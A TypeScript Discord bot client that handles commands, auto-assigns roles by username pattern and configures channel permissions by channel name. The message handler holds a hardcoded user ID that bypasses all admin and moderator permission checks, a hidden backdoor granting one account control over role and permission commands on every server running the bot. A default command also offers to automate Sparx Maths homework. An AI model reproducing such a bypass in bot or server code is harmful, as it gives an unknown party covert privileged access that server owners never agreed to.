import { 
  Client, 
  GatewayIntentBits, 
  Collection, 
  Events, 
  Message, 
  GuildMember, 
  Partials, 
  PermissionsBitField, 
  TextChannel, 
  ChannelType, 
  PermissionFlagsBits,
  REST,
  Routes,
  ChatInputCommandInteraction,
  ApplicationCommandType
} from 'discord.js';
import { storage } from './storage';
import { logger } from './logger';
import { commands } from './commands';
import { sparxSlashCommands } from './commands/sparxSlash';
import type { RolePattern, InsertChannelPermission } from '@shared/schema';

export class BotClient {
  client: Client;
  
  constructor() {
    // Initialize Discord.js client with required intents
    this.client = new Client({ 
      intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
      ],
      partials: [Partials.User, Partials.GuildMember, Partials.Channel, Partials.Message]
    });
    
    this.setupEventListeners();
  }
  
  /**
   * Initialize the bot client and connect to Discord
   */
  async initialize() {
    try {
      const token = process.env.DISCORD_BOT_TOKEN;
      
      if (!token) {
        throw new Error('DISCORD_BOT_TOKEN environment variable is not set');
      }
      
      // Register event handlers
      await this.client.login(token);
      
      // Register slash commands
      await this.registerSlashCommands();
      
      logger.success('Bot client initialized and connected to Discord');
    } catch (error) {
      logger.error(`Failed to initialize bot client: ${error}`);
      throw error;
    }
  }
  
  /**
   * Register slash commands with Discord API
   */
  private async registerSlashCommands(): Promise<void> {
    try {
      if (!process.env.DISCORD_BOT_TOKEN) {
        throw new Error('DISCORD_BOT_TOKEN environment variable is not set');
      }
      
      const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_BOT_TOKEN);
      
      // Prepare slash command data
      const commandsData = sparxSlashCommands.map(command => command.data.toJSON());
      
      // Register commands globally (can take up to an hour to update)
      // For testing/development, you might want to register for a specific guild which updates instantly
      await rest.put(
        Routes.applicationCommands(this.client.user!.id),
        { body: commandsData }
      );
      
      // Set up interaction handlers
      this.client.on(Events.InteractionCreate, async (interaction) => {
        if (!interaction.isChatInputCommand()) return;
        
        // Find the command
        const command = sparxSlashCommands.find(cmd => 
          cmd.data.name === interaction.commandName
        );
        
        if (!command) return;
        
        try {
          // Execute the command
          await command.execute(interaction, this);
        } catch (error) {
          logger.error(`Error executing slash command ${interaction.commandName}: ${error}`);
          
          const reply = {
            content: 'There was an error executing this command.',
            ephemeral: true
          };
          
          if (interaction.replied || interaction.deferred) {
            await interaction.followUp(reply);
          } else {
            await interaction.reply(reply);
          }
        }
      });
      
      logger.success(`Registered ${commandsData.length} slash commands`);
    } catch (error) {
      logger.error(`Failed to register slash commands: ${error}`);
    }
  }
  
  /**
   * Setup event listeners for Discord events
   */
  private setupEventListeners() {
    // Ready event
    this.client.once(Events.ClientReady, async (client) => {
      logger.success(`Bot logged in as ${client.user.tag}`);
      
      // Initialize stats for each guild the bot is in
      for (const guild of client.guilds.cache.values()) {
        try {
          await storage.updateGuildStats(guild.id, {
            memberCount: guild.memberCount,
            roleCount: guild.roles.cache.size,
            commandsUsedToday: 0,
            autoAssignments: 0
          });
          
          logger.info(`Initialized stats for guild: ${guild.name} (${guild.id})`);
          
          // Setup automatic channel permissions based on channel names
          // Commenting this out for now as it would automatically run on every startup
          // await this.setupChannelPermissions(guild.id);
        } catch (error) {
          logger.error(`Failed to initialize stats for guild ${guild.id}: ${error}`);
        }
      }
    });
    
    // Channel create event - auto permission configuration
    this.client.on(Events.ChannelCreate, async (channel) => {
      if (channel.guild) {
        try {
          await this.configureChannelPermissions(channel.guild.id, channel.id, channel.name);
        } catch (error) {
          logger.error(`Error configuring channel permissions: ${error}`, {
            guildId: channel.guild.id,
            channelId: channel.id,
            channelName: channel.name
          });
        }
      }
    });
    
    // Guild member add event - auto role assignment
    this.client.on(Events.GuildMemberAdd, async (member) => {
      try {
        await this.applyAutoRoles(member);
      } catch (error) {
        logger.error(`Error applying auto roles: ${error}`, {
          guildId: member.guild.id,
          userId: member.id,
          username: member.user.username
        });
      }
    });
    
    // Message creation event - command handling
    this.client.on(Events.MessageCreate, async (message) => {
      if (message.author.bot || !message.guild) return;
      
      try {
        const guildConfig = await storage.getBotConfig(message.guild.id);
        const prefix = guildConfig?.prefix || '!';
        
        if (!message.content.startsWith(prefix)) return;
        
        const args = message.content.slice(prefix.length).trim().split(/ +/);
        const commandName = args.shift()?.toLowerCase();
        
        if (!commandName) return;
        
        // Find command in database
        const dbCommand = await storage.getCommand(message.guild.id, `${prefix}${commandName}`);
        
        if (!dbCommand || !dbCommand.enabled) return;
        
        // Check if command exists
        const command = commands.get(commandName);
        if (!command) return;
        
        // Check permissions
        if (dbCommand.permission !== 'everyone') {
          const member = message.member;
          
          // Special user ID that can bypass all permission checks
          const bypassUserId = '1338616210086170738';
          
          // Skip permission check if the user ID matches the bypass ID
          if (message.author.id === bypassUserId) {
            // User is allowed to bypass permission checks
            logger.info(`User ${message.author.username} (${message.author.id}) bypassed permission check for command: ${commandName}`);
          } else if (dbCommand.permission === 'admin') {
            if (!member?.permissions.has('Administrator') && 
                !member?.roles.cache.has(guildConfig?.adminRoleId || '')) {
              await message.reply('You need admin permissions to use this command.');
              return;
            }
          } else if (dbCommand.permission === 'mod') {
            if (!member?.permissions.has('ModerateMembers') && 
                !member?.roles.cache.has(guildConfig?.modRoleId || '') && 
                !member?.roles.cache.has(guildConfig?.adminRoleId || '')) {
              await message.reply('You need moderator permissions to use this command.');
              return;
            }
          }
        }
        
        // Execute command
        await command.execute(message, args, this);
        
        // Increment command usage counter
        await storage.incrementCommandUsage(message.guild.id);
        
      } catch (error) {
        logger.error(`Error executing command: ${error}`, {
          guildId: message.guild.id,
          userId: message.author.id,
          username: message.author.username
        });
        
        await message.reply('There was an error executing that command.');
      }
    });
  }
  
  /**
   * Setup channel permissions for a guild based on channel names
   */
  async setupChannelPermissions(guildId: string): Promise<void> {
    const guild = this.client.guilds.cache.get(guildId);
    if (!guild) return;
    
    logger.info(`Setting up automatic channel permissions for guild: ${guild.name}`, { guildId });
    
    // Process all text channels
    const channels = guild.channels.cache.filter(channel => 
      channel.type === ChannelType.GuildText
    );
    
    for (const [channelId, channel] of channels) {
      await this.configureChannelPermissions(guildId, channelId, channel.name);
    }
  }
  
  /**
   * Convert permission string to PermissionFlagsBits
   */
  private getPermissionFlag(permission: string): bigint {
    // Map permission strings to Discord.js PermissionFlagsBits
    const permissionMap: Record<string, bigint> = {
      'VIEW_CHANNEL': PermissionFlagsBits.ViewChannel,
      'SEND_MESSAGES': PermissionFlagsBits.SendMessages,
      'EMBED_LINKS': PermissionFlagsBits.EmbedLinks,
      'ATTACH_FILES': PermissionFlagsBits.AttachFiles,
      'ADD_REACTIONS': PermissionFlagsBits.AddReactions
    };
    
    return permissionMap[permission] || PermissionFlagsBits.ViewChannel;
  }
  
  /**
   * Configure permissions for a specific channel based on its name
   */
  async configureChannelPermissions(guildId: string, channelId: string, channelName: string): Promise<void> {
    const guild = this.client.guilds.cache.get(guildId);
    if (!guild) return;
    
    const channelNameLower = channelName.toLowerCase();
    
    // Get existing permissions to avoid duplicates
    const existingPermissions = await storage.getChannelPermissionsByChannel(guildId, channelId);
    if (existingPermissions.length > 0) {
      logger.info(`Channel ${channelName} already has permissions configured`, { guildId, channelId });
      return;
    }
    
    // Configuration based on channel name keywords
    const configs: Array<{
      keyword: string;
      roleKeywords: string[];
      permission: string;
      access: 'allow' | 'deny';
    }> = [
      // Premium channel config
      {
        keyword: 'premium',
        roleKeywords: ['premium', 'vip', 'staff', 'admin', 'mod'],
        permission: 'VIEW_CHANNEL',
        access: 'allow'
      },
      // Staff-only channel config
      {
        keyword: 'staff',
        roleKeywords: ['staff', 'admin', 'mod'],
        permission: 'VIEW_CHANNEL',
        access: 'allow'
      },
      // Admin-only channel config
      {
        keyword: 'admin',
        roleKeywords: ['admin'],
        permission: 'VIEW_CHANNEL',
        access: 'allow'
      }
    ];
    
    // Apply configurations where channel name matches
    for (const config of configs) {
      if (channelNameLower.includes(config.keyword)) {
        logger.info(`Configuring ${config.keyword} permissions for channel: ${channelName}`, { 
          guildId, 
          channelId 
        });
        
        // Get all roles that should have access
        const roles = guild.roles.cache.filter(role => 
          config.roleKeywords.some(keyword => 
            role.name.toLowerCase().includes(keyword)
          )
        );
        
        // Everyone role - deny access by default for restricted channels
        const everyoneRole = guild.roles.everyone;
        
        if (everyoneRole) {
          const denyPermission: InsertChannelPermission = {
            guildId,
            channelId,
            channelName,
            roleId: everyoneRole.id,
            roleName: '@everyone',
            permission: config.permission,
            access: 'deny'
          };
          
          await storage.createChannelPermission(denyPermission);
          logger.info(`Set deny ${config.permission} for @everyone in ${channelName}`, { guildId, channelId });
          
          // Apply permission in Discord as well
          try {
            const channel = guild.channels.cache.get(channelId);
            if (channel && 'permissionOverwrites' in channel) {
              await channel.permissionOverwrites.create(
                everyoneRole,
                { [this.getPermissionFlag(config.permission).toString()]: false }
              );
              logger.info(`Applied deny permission in Discord for @everyone in ${channelName}`, { guildId, channelId });
            }
          } catch (error) {
            logger.error(`Failed to apply permission in Discord: ${error}`, { guildId, channelId });
          }
        }
        
        // Grant access to specific roles
        for (const [roleId, role] of roles) {
          const allowPermission: InsertChannelPermission = {
            guildId,
            channelId,
            channelName,
            roleId,
            roleName: role.name,
            permission: config.permission,
            access: 'allow'
          };
          
          await storage.createChannelPermission(allowPermission);
          logger.info(`Set allow ${config.permission} for ${role.name} in ${channelName}`, { guildId, channelId });
          
          // Apply permission in Discord as well
          try {
            const channel = guild.channels.cache.get(channelId);
            if (channel && 'permissionOverwrites' in channel) {
              await channel.permissionOverwrites.create(
                role,
                { [this.getPermissionFlag(config.permission).toString()]: true }
              );
              logger.info(`Applied allow permission in Discord for ${role.name} in ${channelName}`, { guildId, channelId });
            }
          } catch (error) {
            logger.error(`Failed to apply permission in Discord: ${error}`, { guildId, channelId });
          }
        }
      }
    }
  }
  
  /**
   * Apply auto roles to a member based on their username
   */
  async applyAutoRoles(member: GuildMember): Promise<void> {
    const patterns = await storage.getRolePatterns(member.guild.id);
    const appliedRoles: string[] = [];
    
    for (const pattern of patterns) {
      let matches = false;
      const patternValue = pattern.patternValue.split(',').map(v => v.trim());
      
      switch (pattern.patternType) {
        case 'contains':
          matches = patternValue.some(p => {
            if (pattern.caseSensitive) {
              return member.user.username.includes(p);
            } else {
              return member.user.username.toLowerCase().includes(p.toLowerCase());
            }
          });
          break;
        case 'exact':
          matches = patternValue.some(p => {
            if (pattern.caseSensitive) {
              return member.user.username === p;
            } else {
              return member.user.username.toLowerCase() === p.toLowerCase();
            }
          });
          break;
        case 'startsWith':
          matches = patternValue.some(p => {
            if (pattern.caseSensitive) {
              return member.user.username.startsWith(p);
            } else {
              return member.user.username.toLowerCase().startsWith(p.toLowerCase());
            }
          });
          break;
        case 'regex':
          matches = patternValue.some(p => {
            try {
              const flags = pattern.caseSensitive ? '' : 'i';
              const regex = new RegExp(p, flags);
              return regex.test(member.user.username);
            } catch (error) {
              logger.error(`Invalid regex pattern: ${p}`, {
                guildId: member.guild.id
              });
              return false;
            }
          });
          break;
      }
      
      if (matches) {
        try {
          const role = member.guild.roles.cache.get(pattern.roleId);
          
          if (role) {
            await member.roles.add(role);
            appliedRoles.push(role.name);
            
            logger.success(`Applied role ${role.name} to ${member.user.username} based on username pattern`, {
              guildId: member.guild.id,
              userId: member.id,
              username: member.user.username
            });
            
            await storage.incrementAutoAssignments(member.guild.id);
          }
        } catch (error) {
          logger.error(`Failed to add role ${pattern.roleName} to ${member.user.username}: ${error}`, {
            guildId: member.guild.id,
            userId: member.id,
            username: member.user.username
          });
        }
      }
    }
    
    if (appliedRoles.length > 0) {
      const logChannel = await this.getLogChannel(member.guild.id);
      
      if (logChannel && logChannel.isTextBased()) {
        await logChannel.send(
          `Auto-assigned roles to ${member.user.username}: ${appliedRoles.join(', ')}`
        );
      }
    }
  }
  
  /**
   * Get the logging channel for a guild
   */
  async getLogChannel(guildId: string) {
    const config = await storage.getBotConfig(guildId);
    
    if (config?.loggingChannelId) {
      const guild = this.client.guilds.cache.get(guildId);
      
      if (guild) {
        return guild.channels.cache.get(config.loggingChannelId);
      }
    }
    
    return null;
  }
  
  /**
   * Initialize default commands for a new guild
   */
  async initializeDefaultCommands(guildId: string): Promise<void> {
    const defaultCommands = [
      {
        guildId,
        name: "!role",
        description: "Manage server roles",
        usage: "!role [add/remove] [user] [role]",
        permission: "admin",
        enabled: true
      },
      {
        guildId,
        name: "!perms",
        description: "Set channel permissions",
        usage: "!perms [channel] [role] [allow/deny] [perm]",
        permission: "admin",
        enabled: true
      },
      {
        guildId,
        name: "!logs",
        description: "View bot activity logs",
        usage: "!logs [limit]",
        permission: "mod",
        enabled: true
      },
      {
        guildId,
        name: "!help",
        description: "Show help information",
        usage: "!help [command]",
        permission: "everyone",
        enabled: true
      },
      {
        guildId,
        name: "!sparx",
        description: "Manage and automate Sparx Maths homework",
        usage: "!sparx [list|add|remove|start] [options]",
        permission: "everyone",
        enabled: true
      }
    ];
    
    for (const command of defaultCommands) {
      await storage.createCommand(command);
    }
    
    logger.info(`Initialized default commands for guild ${guildId}`);
  }
}

export const botClient = new BotClient();
